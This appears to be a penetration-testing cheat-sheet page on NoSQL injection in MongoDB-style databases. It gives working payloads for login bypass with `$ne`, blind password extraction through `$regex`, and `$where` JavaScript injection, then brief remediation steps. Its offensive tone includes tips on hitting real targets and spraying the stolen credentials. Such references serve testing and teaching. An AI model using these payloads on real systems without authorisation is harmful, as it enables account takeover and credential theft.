---
tags:
  - Web
---

# :material-leaf: NoSQL Injection

<span class="pill pill-medium">common</span> <span class="pill pill-info">web</span>

Document stores (MongoDB, CouchDB) don't use SQL, but they still trust user input in query *operators*. Inject an operator and you change the query's logic — no quotes required.

!!! abstract "TL;DR"
    Swap a string parameter for a query object. `{"$ne": null}`, `{"$gt": ""}`, and `{"$regex": "..."}` are your always-true / oracle primitives.

## :material-login: Auth bypass

If the login sends JSON, replace the string with an operator object:

=== "JSON body"

    ```json
    { "user": "admin", "pass": { "$ne": null } }
    ```

=== "URL-encoded"

    ```http
    user[$ne]=x&pass[$ne]=x
    ```

Both make `WHERE pass != x` — true for the first user (often `admin`).

## :material-magnify: Blind extraction

No output? Use `$regex` as a boolean oracle, char by char:

```json
{ "user": "admin", "pass": { "$regex": "^s" } }   // true if password starts with 's'
```

Automate with `nosqlmap` or a short script walking the alphabet.

## :material-code-json: Operator injection in `$where`

Server-side JS evaluation is the jackpot:

```json
{ "$where": "sleep(5000)" }            // time-based oracle
{ "$where": "this.pass.match(/^a/)" }  // regex leak
```

!!! opsec "Regex is expensive"
    `$regex`/`$where` brute force fires thousands of queries and can lock a DB CPU — throttle on real targets.

## :material-shield-check: Remediation

- Cast input to the expected type before querying; reject objects where a string is expected.
- Disable server-side JS (`--noscripting` in Mongo); never use `$where` with user data.

## :material-link-variant: Related

- Same mindset as [SQL Injection](sqli.md); different syntax.
- Injected creds → spray in [Active Directory](../network/active-directory.md).
- Reference: [PortSwigger NoSQL injection](https://portswigger.net/web-security/nosql-injection).
